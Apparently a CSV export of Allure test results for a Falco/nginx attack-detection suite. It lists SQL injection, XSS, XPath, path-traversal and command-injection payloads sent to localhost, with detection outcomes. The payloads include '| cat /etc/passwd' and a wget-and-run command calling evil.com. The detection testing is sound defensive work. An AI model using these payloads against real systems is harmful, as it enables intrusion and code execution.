"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_002` |
| **Name** | UNION ALL SELECT with multiple NULLs |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `UNION ALL SELECT NULL,NULL`
- **Encoded**: `UNION%20ALL%20SELECT%20NULL%2CNULL`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 12:09:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1769861349361-logd47 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1769861349361-logd47 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:09.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1769861349361-logd47 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[103_SQLI_UNION_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_063` |
| **Name** | Image onerror Handler |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<img src=x onerror=alert(1)>`
- **Encoded**: `%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 12:09:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_063-1769861372400-yn1cdh pattern_id=XSS_ADV_063 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_063-1769861372400-yn1cdh pattern_id=XSS_ADV_063 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:32.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_063-1769861372400-yn1cdh pattern_id=XSS_ADV_063 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[116_XSS_ADV_063]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_013` |
| **Name** | DOM innerHTML injection |
| **Category** | XSS |
| **Subcategory** | dom |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `element.innerHTML='<img src=x onerror=alert(1)>'`
- **Encoded**: `element.innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 12:09:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_013-1769861364885-y78fjc pattern_id=XSS_DOM_013 uri=/?q=element.innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_013-1769861364885-y78fjc pattern_id=XSS_DOM_013 uri=/?q=element.innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:24.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_013-1769861364885-y78fjc pattern_id=XSS_DOM_013 uri=/?q=element.innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[142_XSS_DOM_013]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DBL_004` |
| **Name** | Double encoded Windows-style traversal |
| **Category** | PATH |
| **Subcategory** | double_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252E%252E%255C`
- **Encoded**: `%25252E%25252E%25255C`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `FAILED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Double-encoded path traversal` |
| **Matched Rule** | `None` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[217_PATH_DBL_004]","allure","2026-01-31","failed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_BLIND_001` |
| **Name** | XPath substring blind injection |
| **Category** | XPATH |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' or substring(//user[1]/password,1,1)='a' or '1'='2`
- **Encoded**: `%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 12:09:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1769861377833-6gqtba pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1769861377833-6gqtba pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1

**Falco Log Entry**:
```
12:09:37.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BLIND_001-1769861377833-6gqtba pattern_id=XPATH_BLIND_001 uri=/?q=%27%20or%20substring%28%2F%2Fuser%5B1%5D%2Fpassword%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%272 client=127.0.0.1
```","2","test_e2e_with_logs[343_XPATH_BLIND_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_003` |
| **Name** | SQL Server WAITFOR DELAY |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `WAITFOR DELAY '0:0:5'`
- **Encoded**: `WAITFOR%20DELAY%20%270%3A0%3A5%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 12:08:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_003-1769861337332-y3iu1 pattern_id=SQLI_TIME_003 uri=/?q=WAITFOR%20DELAY%20%270%3A0%3A5%27 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_003-1769861337332-y3iu1 pattern_id=SQLI_TIME_003 uri=/?q=WAITFOR%20DELAY%20%270%3A0%3A5%27 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:08:57.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_003-1769861337332-y3iu1 pattern_id=SQLI_TIME_003 uri=/?q=WAITFOR%20DELAY%20%270%3A0%3A5%27 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[086_SQLI_TIME_003]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_NEST_001` |
| **Name** | Nested dollar-paren |
| **Category** | CMDINJ |
| **Subcategory** | nested_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$($(echo whoami))`
- **Encoded**: `%24(%24(echo%20whoami))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 12:09:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_NEST_001-1769861374380-xtwfj8 pattern_id=CMD_NEST_001 uri=/?q=%24(%24(echo%20whoami)) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_NEST_001-1769861374380-xtwfj8 pattern_id=CMD_NEST_001 uri=/?q=%24(%24(echo%20whoami)) client=127.0.0.1

**Falco Log Entry**:
```
12:09:34.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_NEST_001-1769861374380-xtwfj8 pattern_id=CMD_NEST_001 uri=/?q=%24(%24(echo%20whoami)) client=127.0.0.1
```","2","test_e2e_with_logs[311_CMD_NEST_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_018` |
| **Name** | SQL Server WAITFOR TIME |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `WAITFOR TIME '00:00:05'`
- **Encoded**: `WAITFOR%20TIME%20'00%3A00%3A05'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 12:09:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1769861346854-sryv1 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1769861346854-sryv1 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:06.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1769861346854-sryv1 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[101_SQLI_TIME_018]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_063` |
| **Name** | Pipe Cat Passwd |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `| cat /etc/passwd`
- **Encoded**: `%7C%20cat%20%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~16000ms
- **Timestamp**: 12:09:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1769861382398-lu514l pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1769861382398-lu514l pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
12:09:42.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1769861382398-lu514l pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[259_CMD_ADV_063]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_005` |
| **Name** | Hex encoded whoami command |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\x77\x68\x6f\x61\x6d\x69`
- **Encoded**: `%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[303_CMD_ENC_005]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_067` |
| **Name** | Wget Remote Script |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `wget http://evil.com/shell.sh -O /tmp/s && sh /tmp/s`
- **Encoded**: `wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs%20%26%26%20sh%20%2Ftmp%2Fs`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 12:09:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ADV_067-1769861384404-vgw7ar pattern_id=CMD_ADV_067 uri=/?q=wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs%20%26%26%20sh%20%2Ftmp%2Fs client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ADV_067-1769861384404-vgw7ar pattern_id=CMD_ADV_067 uri=/?q=wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs%20%26%26%20sh%20%2Ftmp%2Fs client=127.0.0.1

**Falco Log Entry**:
```
12:09:44.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ADV_067-1769861384404-vgw7ar pattern_id=CMD_ADV_067 uri=/?q=wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs%20%26%26%20sh%20%2Ftmp%2Fs client=127.0.0.1
```","1","test_e2e_with_logs[263_CMD_ADV_067]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_007` |
| **Name** | Base64 + URL encoded SLEEP(5) |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `U0xFRVAoNSk%3D`
- **Encoded**: `U0xFRVAoNSk%253D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 12:08:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_007-1769861339337-3pnwe pattern_id=SQLI_TIME_007 uri=/?q=U0xFRVAoNSk%253D client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_007-1769861339337-3pnwe pattern_id=SQLI_TIME_007 uri=/?q=U0xFRVAoNSk%253D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:08:59.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_007-1769861339337-3pnwe pattern_id=SQLI_TIME_007 uri=/?q=U0xFRVAoNSk%253D client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[090_SQLI_TIME_007]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_015` |
| **Name** | DOM insertAdjacentHTML injection |
| **Category** | XSS |
| **Subcategory** | dom |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `insertAdjacentHTML('beforeend','<script>alert(1)</script>')`
- **Encoded**: `insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E')`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 12:09:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_015-1769861365887-kkmqx pattern_id=XSS_DOM_015 uri=/?q=insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E') client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_015-1769861365887-kkmqx pattern_id=XSS_DOM_015 uri=/?q=insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E') client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:25.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_015-1769861365887-kkmqx pattern_id=XSS_DOM_015 uri=/?q=insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E') client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[144_XSS_DOM_015]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_006` |
| **Name** | MySQL EXP overflow error injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND EXP(~(SELECT * FROM (SELECT version())x)) --`
- **Encoded**: `%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20version%28%29%29x%29%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 12:09:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_006-1769861360884-hsl32 pattern_id=SQLI_ERROR_006 uri=/?q=%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20version%28%29%29x%29%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_006-1769861360884-hsl32 pattern_id=SQLI_ERROR_006 uri=/?q=%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20version%28%29%29x%29%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:20.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_006-1769861360884-hsl32 pattern_id=SQLI_ERROR_006 uri=/?q=%27%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20version%28%29%29x%29%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[063_SQLI_ERROR_006]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_URL_002` |
| **Name** | URL encoded double traversal |
| **Category** | PATH |
| **Subcategory** | url_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%2F..%2F`
- **Encoded**: `..%252F..%252F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 12:09:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] URL-encoded path traversal` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=PATH_URL_002-1769861377395-tfr71p pattern_id=PATH_URL_002 uri=/?q=..%252F..%252F client=127.0.0.1 method=GET` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=PATH_URL_002-1769861377395-tfr71p pattern_id=PATH_URL_002 uri=/?q=..%252F..%252F client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:37.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=PATH_URL_002-1769861377395-tfr71p pattern_id=PATH_URL_002 uri=/?q=..%252F..%252F client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[246_PATH_URL_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
